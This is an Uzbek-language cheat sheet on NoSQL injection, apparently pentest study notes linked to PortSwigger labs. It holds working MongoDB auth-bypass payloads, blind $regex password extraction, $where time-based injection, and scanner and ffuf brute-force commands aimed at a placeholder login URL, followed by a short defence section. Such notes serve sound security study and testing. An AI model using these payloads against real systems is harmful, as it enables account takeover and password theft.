# NoSQL Injection

> Lab yechimlari (PortSwigger'ning 4 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
NoSQL DB (MongoDB, CouchDB...) so'rovlari ko'pincha JSON/obyekt ko'rinishida bo'ladi va maxsus
**operatorlar** (`$ne`, `$gt`, `$regex`, `$where`) bilan ishlaydi. Agar ilova foydalanuvchi
inputini so'rovga **tozalamay** (tur tekshirmay) qo'shsa, sen oddiy string o'rniga **operator
obyekti** yuborasan (`{"$ne":""}`) va so'rov mantig'ini buzasan — yoki `$where` orqali server-side
JavaScript ishlatasan.

**Ildiz sabab:** SQLi bilan bir xil — data va query aralashgan. NoSQL'da ayniqsa xavfli, chunki
ko'p ilova JSON body'ni to'g'ridan so'rovga beradi va "parol string bo'ladi" deb tur tekshirmaydi.
`{"$ne":""}` esa "bo'sh bo'lmagan hamma narsa" degani → parolsiz mos keladi.

## Turlari
1. **Operator injection** — `$ne`, `$gt`, `$regex`, `$in` ni so'rovga joylash (auth bypass, extraction).
2. **JavaScript injection** — `$where`, `mapReduce` kabi server-side JS bajaradigan joy (blind, RCE-ga yaqin).
> Har biri **syntax** (so'rovni sintaktik buzish) yoki **operator/JS** (mantiqni buzish) shaklida bo'ladi.

## Oqibatlar (IMPACT)
- **Auth bypass** — `{"$ne":""}`/`{"$regex":"admin.*"}` bilan parolsiz admin bo'lib kirish.
- **Ma'lumotni belgi-belgi sug'urish** (`$regex`/`$where` blind).
- `$where` server-side JS → logika buzish, ba'zan RCE-ga yaqin.
> Auth bypass chiqsa **High**.

## Auth bypass (MongoDB)
```json
# JSON body (eng oson)
{"username":"admin","password":{"$ne":"x"}}
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$regex":"^admin"},"password":{"$ne":"x"}}

# Form-encoded (param'ni massivga aylantirish)
username=admin&password[$ne]=x
user[$regex]=.*&pass[$regex]=.*
```
> `password[$ne]=x` → `{"password":{"$ne":"x"}}` bo'lib parse bo'ladi.

## Blind data extraction (`$regex`)
```json
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^ad"}}
```
> Login muvaffaqiyat/xato farqidan parolni belgi-belgi aniqlaysan.

## JS injection (`$where`)
```json
{"$where":"sleep(5000)"}                  // time-based blind
{"username":"admin","$where":"this.password.match(/^a/)"}
```

## TOOLLAR

### NoSQLMap — NoSQLi avtomat
```bash
python nosqlmap.py
```
> MongoDB auth bypass va data extraction'ni avtomat sinab chiqadi (interaktiv).

### nosqli (Charlie Belmer) — CLI skaner
```bash
nosqli scan -t "https://target.com/login" -r request.txt
```
> Login request'ni olib, operator injection payloadlarini avtomat uradi.

### ffuf — $regex bilan belgi-belgi brute
```bash
ffuf -w <(for c in {a..z} {0..9}; do echo "$c"; done) -u "https://target.com/login" -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":{"$regex":"^FUZZ"}}' -mr "success"
```
> Har belgini `$regex` bilan sinab, "success" qaytganini topadi — parolni tiklaydi.

### Burp Intruder — operator fuzzing
```
Intruder → password qiymatini payload qil → {"$ne":"x"}, {"$gt":""}, {"$regex":".*"} wordlist
```
> Qaysi operator auth bypass berishini qo'lda aniqlaysan.

## PoC
Auth bypass → admin bo'lib kirish (screenshot). Blind → bitta hashning bir necha belgisi
(to'liq dump qilma).

## Himoya
Input tip tekshiruvi (string kutilsa obyekt rad), `$`/`.` bilan boshlanadigan kalitni
rad, `$where`/server-side JS o'chirish, ODM schema (Mongoose), least-privilege DB user.
